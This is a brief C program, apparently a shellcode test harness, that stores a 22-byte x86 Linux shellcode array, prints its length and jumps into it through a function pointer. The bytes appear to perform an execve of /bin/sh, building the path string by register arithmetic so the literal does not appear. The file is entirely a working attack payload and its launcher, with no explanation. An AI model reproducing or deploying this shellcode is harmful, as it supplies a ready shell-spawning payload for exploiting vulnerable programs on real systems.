#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = \
"\x96\xb0\x0b\x51\xbe\x2f\x2f\x73\x68\x56\x4e"
"\x81\xc6\x01\x33\xf6\x05\x56\x89\xe3\xcd\x80";
int main(int argc, char* argv[])
{
	printf("\nShellcode 1 Length:  %d\n", strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}

